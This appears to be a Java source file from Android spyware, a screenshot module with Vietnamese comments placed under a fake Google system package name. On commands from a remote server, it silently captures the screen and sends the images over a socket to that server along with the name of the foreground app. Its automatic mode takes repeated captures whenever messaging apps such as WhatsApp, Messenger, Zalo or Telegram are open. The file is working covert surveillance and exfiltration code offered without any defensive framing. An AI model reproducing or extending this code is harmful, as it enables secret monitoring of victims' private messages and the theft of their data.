package com.google.android.sys.security;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;

/**
 * Screenshot Manager
 * Xử lý việc chụp màn hình và gửi lên server
 * 
 * Phương pháp:
 * 1. Server gửi lệnh chụp screenshot
 * 2. App chụp màn hình hiện tại
 * 3. Compress và gửi lên server
 * 4. Xóa file local (tiết kiệm storage)
 */
public class ScreenshotManager {
    private static final String TAG = "ScreenshotManager";
    private static final int JPEG_QUALITY = 40; // Giảm quality để giảm size
    
    private Context context;
    private static ScreenshotManager instance;

    private ScreenshotManager(Context context) {
        this.context = context.getApplicationContext();
    }

    public static synchronized ScreenshotManager getInstance(Context context) {
        if (instance == null) {
            instance = new ScreenshotManager(context);
        }
        return instance;
    }

    /**
     * Chụp screenshot của màn hình hiện tại
     * Sử dụng root view của window
     */
    public void takeScreenshot() {
        try {
            Log.d(TAG, "Taking screenshot...");
            
            // Method 1: Sử dụng shell command (cần permission)
            takeScreenshotViaShell();
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking screenshot", e);
        }
    }

    /**
     * Chụp screenshot bằng shell command
     * Hoạt động trên hầu hết Android versions
     */
    private void takeScreenshotViaShell() {
        new Thread(() -> {
            try {
                // Tạo file tạm
                File screenshotFile = new File(context.getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".png");
                
                // Chạy shell command để chụp màn hình
                String command = "screencap -p " + screenshotFile.getAbsolutePath();
                Process process = Runtime.getRuntime().exec(command);
                process.waitFor();
                
                if (screenshotFile.exists() && screenshotFile.length() > 0) {
                    Log.d(TAG, "Screenshot captured: " + screenshotFile.length() + " bytes");
                    
                    // Đọc file và gửi lên server
                    sendScreenshotFile(screenshotFile);
                    
                    // Xóa file tạm
                    screenshotFile.delete();
                } else {
                    Log.e(TAG, "Screenshot file not created");
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error in shell screenshot", e);
            }
        }).start();
    }

    /**
     * Gửi screenshot file lên server
     */
    private void sendScreenshotFile(File file) {
        try {
            // Đọc file thành byte array
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            fis.read(buffer);
            fis.close();
            
            // Compress nếu file quá lớn
            if (buffer.length > 500 * 1024) { // > 500KB
                buffer = compressImage(buffer);
            }
            
            // Gửi lên server
            sendToServer(buffer);
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending screenshot file", e);
        }
    }

    /**
     * Compress ảnh để giảm size
     */
    private byte[] compressImage(byte[] imageData) {
        try {
            // Decode byte array thành Bitmap
            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
            options.inSampleSize = 2; // Giảm kích thước 50%
            
            Bitmap bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length, options);
            
            // Compress lại
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
            
            byte[] compressed = baos.toByteArray();
            
            Log.d(TAG, "Compressed: " + imageData.length + " -> " + compressed.length + " bytes");
            
            return compressed;
            
        } catch (Exception e) {
            Log.e(TAG, "Error compressing image", e);
            return imageData;
        }
    }

    /**
     * Gửi screenshot lên server qua socket
     */
    private void sendToServer(byte[] imageData) {
        try {
            JSONObject data = new JSONObject();
            data.put("screenshot", true);
            data.put("timestamp", System.currentTimeMillis());
            data.put("size", imageData.length);
            data.put("buffer", imageData);
            
            // Lấy thông tin foreground app
            String foregroundApp = getForegroundApp();
            if (foregroundApp != null) {
                data.put("app", foregroundApp);
            }
            
            // Gửi qua socket
            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                IOSocket.getInstance().getIoSocket().emit("x0000ss", data);
                Log.d(TAG, "Screenshot sent to server (" + imageData.length + " bytes)");
            } else {
                Log.e(TAG, "Socket not connected");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending to server", e);
        }
    }

    /**
     * Lấy tên app đang chạy foreground
     */
    private String getForegroundApp() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) 
                context.getSystemService(Context.ACTIVITY_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                java.util.List<android.app.ActivityManager.RunningAppProcessInfo> processes = 
                    am.getRunningAppProcesses();
                
                if (processes != null) {
                    for (android.app.ActivityManager.RunningAppProcessInfo processInfo : processes) {
                        if (processInfo.importance == 
                            android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                            return processInfo.processName;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting foreground app", e);
        }
        return "unknown";
    }

    /**
     * Chụp screenshot theo interval (auto mode)
     */
    public void startAutoScreenshot(long intervalMs) {
        Handler handler = new Handler();
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                String foregroundApp = getForegroundApp();
                
                // Chỉ chụp nếu đang dùng target apps
                if (isTargetApp(foregroundApp)) {
                    takeScreenshot();
                }
                
                handler.postDelayed(this, intervalMs);
            }
        };
        
        handler.post(runnable);
        Log.d(TAG, "Auto screenshot started (interval: " + intervalMs + "ms)");
    }

    /**
     * Kiểm tra xem có phải target app không
     */
    private boolean isTargetApp(String packageName) {
        if (packageName == null) return false;
        
        return packageName.contains("zalo") ||
               packageName.contains("messenger") ||
               packageName.contains("facebook") ||
               packageName.contains("whatsapp") ||
               packageName.contains("viber") ||
               packageName.contains("telegram");
    }
}
